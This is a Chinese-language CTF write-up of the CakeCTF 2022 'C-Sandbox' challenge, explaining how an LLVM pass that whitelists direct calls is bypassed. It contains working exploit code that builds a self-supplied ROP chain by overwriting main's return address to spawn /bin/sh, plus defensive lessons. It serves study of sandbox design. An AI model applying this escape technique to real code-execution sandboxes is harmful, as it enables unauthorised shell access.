# CakeCTF 2022 C-Sandbox Writeup

## 题目简述

服务接收一段 C 源码，依次经过 Clang、LLVM bitcode 和自定义 `Sandbox` pass，最后编译并运行。该 pass 遍历 LLVM IR 中的调用指令，只允许直接调用：

```text
puts, printf, __isoc99_scanf, exit
```

其他调用前会被插入 `puts` 和 `exit(1)`。目标是在不能直接调用 `system`、`execve` 等函数的情况下获得 shell。

决定性缺陷是检查只覆盖 IR 中的函数调用，没有约束普通内存读写，也没有约束函数返回后的控制流。于是可以由提交的 C 程序主动覆盖自己的返回地址并构造 ROP。

## 解题过程

### 绕过调用检查

直接写 `system("/bin/sh")` 会生成对 `system` 的调用，必然触发插桩。仅把 `system` 当作函数地址写入内存则不会产生 `CallInst`，因此不会被 pass 拦截：

```c
void *target = system;
```

同理，程序可以从局部数组起始位置向高地址连续写入，覆盖保存的返回地址。Sandbox 没有检查越界写。

### 自带 ROP gadget

为了不依赖固定二进制偏移，官方解法定义两个返回常量的函数，并从函数地址附近逐字节搜索机器码：

```c
long gadget_ret(void) { return 0xc3; }
long gadget_pop_rdi(void) { return 0xc35f; }
```

常量会出现在生成的函数机器码中，因此可以找到字节序列 `c3`（`ret`）和 `5f c3`（`pop rdi; ret`）。这就是题目 flag 所提示的 bring your own gadget。

### 覆盖返回地址

以一个很小的栈数组为起点持续写入，最终布置：

```text
若干 ret
pop rdi; ret
"/bin/sh" 的地址
system 的地址
pop rdi; ret
0
exit 的地址
```

精简后的核心代码如下：

```c
#include <stdio.h>
#include <stdlib.h>

long gadget_ret(void) { return 0xc3; }
long gadget_pop_rdi(void) { return 0xc35f; }

int main(void) {
    char buf[0x10];
    void *ret = (void *)gadget_ret;
    void *pop_rdi = (void *)gadget_pop_rdi;

    while (*(unsigned char *)ret != 0xc3)
        ret++;
    while (*(unsigned char *)pop_rdi != 0x5f ||
           *((unsigned char *)pop_rdi + 1) != 0xc3)
        pop_rdi++;

    void **chain = (void **)buf;
    for (int i = 0; i < 8; i++)
        *chain++ = ret;
    *chain++ = pop_rdi;
    *chain++ = "/bin/sh";
    *chain++ = system;
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = exit;
    return 0;
}
```

`main` 返回时开始执行这条 ROP 链，`system("/bin/sh")` 并不是由原始 LLVM IR 中的调用指令触发，因此绕过检查。进入 shell 后读取 flag：

```text
CakeCTF{briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!}
```

## 方法总结

这道题不是寻找允许列表里的危险函数，而是利用检查层和最终执行层之间的语义差距。LLVM pass 只检查显式调用，却允许任意指针运算、越界写和间接控制流，攻击者便能在运行时制造一个检查器从未见过的调用。

如果要实现真正的 C 沙箱，单纯改写 IR 调用远远不够；至少还需要内存安全、间接跳转约束和操作系统层的进程隔离、权限降级及 syscall 策略。
